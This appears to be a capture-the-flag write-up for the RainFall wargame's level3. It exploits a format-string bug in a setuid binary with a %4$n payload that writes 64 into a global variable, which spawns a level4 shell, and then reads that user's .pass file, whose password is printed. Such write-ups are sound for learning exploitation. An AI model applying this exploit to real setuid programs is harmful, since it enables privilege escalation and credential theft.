level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3

we can exploit a format string 
https://www.exploit-db.com/exploits/23985

level3@RainFall:~$ ./level3 
%n
Segmentation fault (core dumped)
level3@RainFall:~$ ./level3 
%x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825


```
extern unsigned int m;
...
    if (m == 64)
    {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
```
                     
level3@RainFall:~$ ./level3 
AAAAAAAAAAAAAAAAAAA %x %x %x %x %x %x %x %x %x %x 
AAAAAAAAAAAAAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 20414141 25207825 78252078 

we can see that 
200 first value on the pile
then we have the adresse b7fd1ac0 and b7ff37d0 
and the character "A" (0x41) 
the value of fgets are set after the 3rd adress

   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax; 40 == 0x804988c 
m is set at 0x804988c

we can set value in m with the format %4$n; 
[::-1] will write in little endian
 + "A"*60 will add the remaining char to reach 64 


level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "A"*60 + "%4$n"' > input.txt
level3@RainFall:~$ cat input.txt - | ./level3 
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4

pwd
/home/user/level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa